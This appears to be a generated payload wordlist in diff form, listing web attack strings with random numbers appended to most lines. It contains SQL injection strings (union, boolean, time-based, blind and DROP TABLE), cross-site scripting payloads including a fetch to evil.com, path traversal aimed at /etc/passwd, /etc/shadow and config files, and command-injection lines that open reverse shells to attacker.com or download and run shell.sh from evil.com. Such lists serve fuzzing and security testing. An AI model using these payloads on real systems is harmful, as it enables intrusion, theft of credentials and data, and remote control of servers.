+' UNION SELECT NULL,NULL,NULL--730
+' UNION SELECT NULL,NULL,NULL--1505
+/etc/hosts1735
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`3371
+/etc/issue1733
+' OR 1=1 LIMIT 1 --4099
+' OR benchmark(1000000,MD5(1))--3205
+<img src=x onerror=console.log('test')>7182
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`9799
+<img src=x onerror=alert('XSS')>1107
+../../../../etc/passwd1300
+<math href='javascript:alert(1)'>7330
+../../../../etc/passwd2919
+<svg/onload=alert('XSS')>5937
+' UNION SELECT NULL,NULL,NULL--6575
+' OR 1=1 LIMIT 1 --3015
+' OR 1=1 LIMIT 1 --112
+<script>alert(1)</script>1185
+../../../../windows/win.ini5878
+`curl http://evil.com/shell.sh | sh`5764
+<math href='javascript:alert(1)'>1598
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`
+../../../../../../../../etc/shadow721
+<svg/onload=alert('XSS')>1388
+/etc/issue2632
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>988
+<script>alert(1)</script>8511
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`1199
+' AND SLEEP(5)--5524
+`nc -e /bin/sh attacker.com 4444`3348
+' OR 1=1#4323
+<img src=x onerror=console.log('test')>7991
+/etc/issue5114
+' AND SLEEP(5)--716
+' OR 1=1#6370
+../../../../../../../../etc/shadow5963
+<img src=x onerror=console.log('test')>2002
+' OR '1'='1' /*871
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`4840
+../../../../windows/win.ini771
+`curl http://evil.com/shell.sh | sh`7705
+<img src=x onerror=alert('XSS')>8626
+' OR sleep(10)#6178
+<math href='javascript:alert(1)'>8871
+/etc/hosts4834
+<iframe src='javascript:alert(1)'></iframe>4839
+<iframe src='javascript:alert(1)'></iframe>9635
+/etc/issue522
+<img src=x onerror=alert('XSS')>7532
+' OR 1=1 LIMIT 1 --8491
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>427
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`7190
+<iframe src='javascript:alert(1)'></iframe>3644
+<math href='javascript:alert(1)'>8822
+<script>alert(1)</script>326
+' OR sleep(10)#7022
+<iframe src='javascript:alert(1)'></iframe>3177
+<iframe src='javascript:alert(1)'></iframe>9438
+../../../../etc/passwd1321
+../../../../etc/passwd4617
+../../../../etc/passwd2066
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`5148
+/../../../var/www/html/config.php3357
+' OR 1=1#30
+<svg/onload=alert('XSS')>6935
+' UNION SELECT NULL,NULL,NULL--9154
+<script>alert(1)</script>8593
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`7745
+<body onload=alert('XSS')>3310
+<script>alert(1)</script>1475
+' OR benchmark(1000000,MD5(1))--8413
+' OR '1'='1' /*9744
+<img src=x onerror=alert('XSS')>9618
+<svg/onload=fetch('http://evil.com')>437
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`1129
+/etc/hosts3439
+<body onload=alert('XSS')>8147
+' AND SLEEP(5)--5459
+' OR 1=1 --5848
+' OR 1=1 LIMIT 1 --1969
+' OR 1=1#1
+../../../../../../../../etc/shadow5672
+<iframe src='javascript:alert(1)'></iframe>834
+<body onload=alert('XSS')>2011
+../../../../windows/win.ini8949
+/etc/issue2442
+' OR 1=1 --1861
+' OR 1=1 LIMIT 1 --4845
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`9244
+' UNION SELECT NULL,NULL,NULL--47
+`curl http://evil.com/shell.sh | sh`1527
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`9865
+<img src=x onerror=alert('XSS')>9366
+<img src=x onerror=alert('XSS')>9825
+<svg/onload=alert('XSS')>5970
+/etc/hosts7273
+' AND ascii(substring((select database()),1,1))>64--6546
+' UNION SELECT NULL,NULL,NULL--6969
+'; DROP TABLE users; --6610
+' UNION SELECT NULL,NULL,NULL--6254
+<body onload=alert('XSS')>9208
+/etc/issue6281
+' OR '1'='1' /*8329
+<body onload=alert('XSS')>3138
+<img src=x onerror=alert('XSS')>5950
+`curl http://evil.com/shell.sh | sh`1755
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`6533
+`curl http://evil.com/shell.sh | sh`9029
+../../../../../../../../etc/shadow3481
+' UNION SELECT NULL,NULL,NULL--7057
+' UNION SELECT NULL,NULL,NULL--9122
+<math href='javascript:alert(1)'>6795
+../../../../etc/passwd5655
+<iframe src='javascript:alert(1)'></iframe>3603
+' AND SLEEP(5)--1698
+/../../../var/www/html/config.php6176
+`curl http://evil.com/shell.sh | sh`1167
+<iframe src='javascript:alert(1)'></iframe>5194
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>3406
+../../../../etc/passwd9066
+' OR benchmark(1000000,MD5(1))--1014
+'; DROP TABLE users; --6533
+/etc/hosts7853
+../../../../windows/win.ini747
+/etc/issue4672
+' AND ascii(substring((select database()),1,1))>64--5602
+`nc -e /bin/sh attacker.com 4444`6092
+' UNION SELECT NULL,NULL,NULL--9211
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>9877
+<iframe src='javascript:alert(1)'></iframe>964
+'; DROP TABLE users; --
+' UNION SELECT NULL,NULL,NULL--2694
+../../../../../../../../etc/shadow9477
+../../../../windows/win.ini6890
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>2789
+<script>alert(1)</script>5256
+' OR '1'='1' /*7985
+<body onload=alert('XSS')>3756
+<svg/onload=fetch('http://evil.com')>1497
+`nc -e /bin/sh attacker.com 4444`3650
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`2637
+' OR 1=1#2892
+<img src=x onerror=alert('XSS')>375
+<img src=x onerror=alert('XSS')>2468
+/etc/hosts
+<body onload=alert('XSS')>5315
+<img src=x onerror=console.log('test')>6389
+' OR sleep(10)#7111
+<svg/onload=alert('XSS')>4754
+' OR sleep(10)#1668
+' OR benchmark(1000000,MD5(1))--8909
+/etc/issue4394
+`nc -e /bin/sh attacker.com 4444`8251
+' OR benchmark(1000000,MD5(1))--7303
+`curl http://evil.com/shell.sh | sh`
+<img src=x onerror=alert('XSS')>9017
+../../../../windows/win.ini3412
+' UNION SELECT NULL,NULL,NULL--7800
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>1849
+' UNION SELECT NULL,NULL,NULL--5019
+/../../../var/www/html/config.php822
+../../../../../../../../etc/shadow
+<img src=x onerror=alert('XSS')>2179
+<script>alert(1)</script>4088
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`161
+../../../../../../../../etc/shadow3134
+/../../../var/www/html/config.php1489
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`8893
+<iframe src='javascript:alert(1)'></iframe>5947
+`curl http://evil.com/shell.sh | sh`6752
+' UNION SELECT NULL,NULL,NULL--1820
+' OR 1=1 --4013
+/etc/issue1011
+'; DROP TABLE users; --1124
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`6273
+<body onload=alert('XSS')>3302
+' OR '1'='1' /*1114
+<script>alert(1)</script>8128
+../../../../../../../../etc/shadow74
+' UNION SELECT NULL,NULL,NULL--9820
+<svg/onload=fetch('http://evil.com')>3350
+../../../../windows/win.ini6001
+' OR 1=1 --4538
+<img src=x onerror=console.log('test')>3834
+' OR '1'='1' /*912
+/../../../var/www/html/config.php4389
+' UNION SELECT NULL,NULL,NULL--8564
+' OR 1=1#8087
+<body onload=alert('XSS')>6143
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`3816
+' OR '1'='1' /*7824
+' OR '1'='1' /*7744
+../../../../etc/passwd2348
+<img src=x onerror=console.log('test')>7427
+' OR '1'='1' /*2927
+`nc -e /bin/sh attacker.com 4444`8231
+/../../../var/www/html/config.php1286
+' OR 1=1 --5235
+' AND ascii(substring((select database()),1,1))>64--1258
+' OR '1'='1' /*
+' OR benchmark(1000000,MD5(1))--2854
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`1705
+../../../../../../../../etc/shadow4262
+/../../../var/www/html/config.php954
+../../../../../../../../etc/shadow470
+' OR 1=1 LIMIT 1 --8851
+/../../../var/www/html/config.php6376
+/etc/hosts2523
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>8456
+' OR sleep(10)#9077
+<svg/onload=alert('XSS')>7867
+/../../../var/www/html/config.php1622
+<img src=x onerror=console.log('test')>8132
+../../../../../../../../etc/shadow1143
+`curl http://evil.com/shell.sh | sh`23
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--639
+<body onload=alert('XSS')>4368
+<iframe src='javascript:alert(1)'></iframe>1368
+<script>alert(1)</script>203
+' OR 1=1 --7717
+<math href='javascript:alert(1)'>2829
+<img src=x onerror=alert('XSS')>3751
+../../../../windows/win.ini5385
+/etc/hosts8048
+`curl http://evil.com/shell.sh | sh`886
+' OR '1'='1' /*586
+' OR 1=1 --6175
+../../../../windows/win.ini
+' OR '1'='1' /*3663
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`771
+' OR '1'='1' /*2365
+' OR '1'='1' /*4301
+../../../../etc/passwd2489
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`7414
+<script>alert(1)</script>4053
+' OR sleep(10)#2409
+' OR 1=1#5395
+' AND ascii(substring((select database()),1,1))>64--6525
+<svg/onload=fetch('http://evil.com')>6418
+../../../../windows/win.ini3913
+' OR '1'='1' /*8536
+<img src=x onerror=alert('XSS')>4172
+`nc -e /bin/sh attacker.com 4444`9828
+' UNION SELECT NULL,NULL,NULL--4927
+' OR '1'='1' /*6675
+<iframe src='javascript:alert(1)'></iframe>2142
+<img src=x onerror=console.log('test')>8021
+<iframe src='javascript:alert(1)'></iframe>9015
